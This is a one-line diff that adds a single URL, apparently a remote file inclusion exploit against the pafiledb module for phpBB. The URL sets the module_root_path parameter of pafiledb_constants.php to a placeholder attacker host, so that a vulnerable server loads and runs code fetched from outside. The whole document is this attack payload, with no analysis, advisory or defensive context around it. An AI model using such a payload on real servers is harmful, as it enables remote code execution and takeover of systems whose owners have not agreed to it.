@@ -1,0 +1,1 @@
+http://www.example.com/[phpBBpath]/[pafiledbpath]/includes/pafiledb_constants.php?module_root_path=http://[attacker]
